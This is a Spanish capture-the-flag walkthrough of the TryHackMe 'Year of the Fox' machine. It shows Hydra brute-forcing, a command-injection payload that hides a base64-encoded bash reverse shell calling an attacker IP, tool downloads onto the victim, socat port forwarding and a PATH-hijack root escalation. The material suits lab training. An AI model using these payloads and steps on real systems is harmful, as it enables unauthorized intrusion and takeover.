# Year of the Fox

**Platform:** TryHackMe  
**Difficulty:** Hard  
**IP:** 10.10.39.77

---

## Información Inicial
- **Objetivo:** Obtener las tres banderas del usuario web, usuario del sistema y root.
- **Herramientas iniciales:** `Nmap`, `enum4linux`, `Hydra`, `Command Injection`, `Netcat`, `linpeas.sh`, `SSH`,`strings`, `Burpsuite`.

---

Primero realizamos un escaneo básico con `nmap` para identificar los puertos abiertos y servicios activos:
```bash 
nmap -sC -sV -p- --min-rate 3000 10.10.39.77
```
!["Ejecución de nmap para obtener los puertos abiertos y los servicios activos](screenshots/1.nmap.png)

En este encontramos un servicio Apache corriendo en el puerto 80 y Samba en sus puertos 139 y 445.

Vamos a empezar explorando el primero desde el navegador web, donde nos muestra un inicio de sesión para el que no tenemos credenciales.

Podríamos realizar una fuerza bruta, pero mejor exploraremos Samba por si tuviera algún fichero o usuario para acceder.


!["Sitio web Apache con inicio de sesión"](screenshots/2.web_server.png)

Para enumerar el servicio Samba vamos a utilizar la herramienta enum4linux, la cuál nos devuelve dos usuarios (`fox` y `rascal`) y una ruta a la que supuestamente solo podemos acceder con el primer usuario.

```bash 
enum4linux -a  10.10.39.77
```

![Ejecución de enum4linux para la búsqueda de vulnerabilidades en Samba](screenshots/3.enum4linux_1.png)

!["Usuarios encontrados con la herramienta enum4linux"](screenshots/4.enum4linux_users.png)

Igualmente, vamos a realizar una fuerza bruta con los dos usuarios al inicio de sesión del sitio web utilizando el diccionario rockyou.txt.

```bash 
hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.49.139 http-get /

hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.49.139 http-get /
```
Por suerte, el ataque es efectivo con el segundo usuario y obtenemos su contraseña.

!["Ataque de fuerza bruta con Hydra para el usuario rascal en el sitio web"](screenshots/5.hydra.png)

Con las credenciales obtenidas entramos al sitio web, que trata de una búsqueda en el sistema a través del ingreso de rutas.
Si escribimos un punto para listar los ficheros actuales nos devuelve el nombre de tres de ellos.

!["Pruebas de entrada en el sitio web que lista ficheros si ingresamos la ruta"](screenshots/6.web_site.png)

Capturamos la sesión con Burpsuite y hacemos pruebas para intentar inyectar código, pero al escribir el carácter '/' lo bloquea. Sin embargo, el carácter '\' sí que lo da por válido pero tras muchas pruebas no conseguimos nada. 

!["Captura de la sesión con Burpsuite y prueba de caracteres válidos."](screenshots/7.permitted_bar.png)

Otra prueba era realizar una reverse shell a partir del contenido del atributo, de manera que después de responder al target con "\" pondríamos un ';' y escribiríamos un comando para solicitar la shell a nuestro Netcat.

```bash
"target":"\";bash -i >& /dev/tcp/10.8.29.132/4444 0>&1
```

> En la captura se ve la dirección IP incorrecta, pero corregida tampoco devolvía nada. 

!["Intento de inyecció de comandos después del atributo target (entrada del sitio web)"](screenshots/8.tryng_bash.png)

Esta prueba no daba ningún problema pero tampoco recibíamos ninguna shell, de manera que se podría tratar de codificar el comando en base64. Lo único es que se debería de acompañar de los comandos pertinentes para descifrar el comando una vez fuera a ser ejecutado, para que el sitio web lo aceptara pero que una vez dentro se pueda ejecutar.

Reverse-shell utilizada: `sh -i >& /dev/tcp/10.8.29.132/4444 0>&1`

Código inyectado:
```bash
"target":"\";echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuOC4yOS4xMzIvNDQ0NCAwPiYx|base64 -d |bash\n"
```

![Inyección de código final para establecer la reverse-shell](screenshots/9.good_request.png)

Y finalmente recibimos la conexión en nuestro Netcat. Entramos como www-data y procedemos a analizar el sistema.

![Establecimiento de shell desde Netcat en el puerto 4444](screenshots/10.netcat.png)

Vamos a abrir un servidor Python en nuestra máquina y a descargarnos la herramienta linpeas.sh desde la máquina víctima para poder realizar un análisis más detallado.

Máquina local:
```bash
python -m http.server
```

Máquina víctima:
```bash
cd /tmp

wget http://10.8.29.132:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh
```

![Ejecución de linpeas.sh para análisis del sistema](screenshots/12.linpeas_1.png)

Entre las rutas destacadas que nos muestra, vemos un fichero dentro de /var/www llamado `web-flag.txt` por lo que lo listamos y encontramos la primera bandera.

![Primera bandera encontrada en la ruta del servicio web](screenshots/11.first_flag.png)

La herramienta linpeas.sh también nos desvela algo sobre los puertos activos, y es que tenemos SSH corriendo en local en el puerto 22.

Suponemos que aquí entrará en juego el usuario `fox`, pero antes tenemos que exponer el servicio para poder acceder desde nuestra máquina local.

![Resultado de linpeas.sh que muestra el servicio SSH corriendo en local (127.0.0.1)](screenshots/13.localhost_ssh.png)

La herramienta más conocida para exponer el servicio de la máquina víctima es `socat`. Descargaremos el fichero de la herramienta en nuestra máquina local y al igual que antes, la descargaremos desde la víctima.

Al ejecutarlo, estaremos abriendo el puerto de la máquina 1212 y redirigiendo el servicio del puerto 22 por este.

```bash
wget http://10.8.29.132:8000/socat

chmod +x socat

./socat TCP-LISTEN:1212,reuseaddr,fork tcp:127.0.0.1:22
```

![Utilización de socat para exponer el puerto 22 por el puerto 1212](screenshots/14.listening_socat.png)

En este punto, podemos enumerar el puerto 1212 de la máquina víctima por lo que ya podemos realizar un ataque de fuerza bruta a SSH con el usuario `fox` y el diccionario rockyou.txt.

```bash
hydra -l fox -P /usr/share/wordlists/rockyou.txt 10.10.39.77 -s 1212 ssh
```

![Fuerza bruta al servicio SSH con el usuario fox](screenshots/15.ssh.png)

Accederemos a SSH con las credenciales. La bandera del usuario se encuentra en el directorio personal del usuario actual.

```bash
cat user-flag.txt
```

Si miramos los permisos con el comando `sudo -l` encontramos un fichero en /usr/sbin/shutdown.

![Acceso a SSH con credenciales obtenidas y revisión de permisos](screenshots/16.sudo-l.png)

Descargaremos el fichero shutdown en la máquina local para analizarlo con strings. En su contenido destaca `poweroff`.

```bash
scp -P 1212 fox@10.10.49.139:/usr/sbin/shutdown .
```

![Descarga del fichero shutdown y uso de Strings para comprobar su contenido](screenshots/17.strings.png)

Buscando en el sistema de la máquina víctima, encontramos que se trata de un fichero que se encarga de apagar el sistema.
Sin embargo, si volvemos a mirar el resultado de `sudo -l` y lo comparamos con el resultado en nuestro equipo, falta una variable `secure_path` que contiene las rutas absolutas del PATH. 

Para realizar esto, crearemos un fichero en el directorio personal del usuario cuyo contenido será invocar una Bash como root, modificaremos el PATH para que apunte hacia nuestra ubicación y luego ejecutaremos el fichero shutdown.

```bash
echo "/bin/bash" > poweroff

chmod +x poweroff

export PATH=$(pwd):$PATH

sudo shutdown
```

![Escala de privilegios para convertirnos a usuario root por medio de vulnerabilidad en PATH](screenshots/18.escala.png)

Por último, en el directorio del usuario root nos dice que utilicemos `find` para encontrar la tercera bandera, de manera que usaremos el siguiente comando para buscar ficheros que contengan la palabra "root".

```bash
find / -type f 2>/dev/null | grep -i 'root'
```

En el directorio del usuario rascal hayamos un fichero (el último fichero que encuentra find) y dentro del mismo hayamos la tercera bandera, la de administrador.

![Bandera de administrador hayada en el fichero del directorio personal de rascal](screenshots/19.root.txt.png)



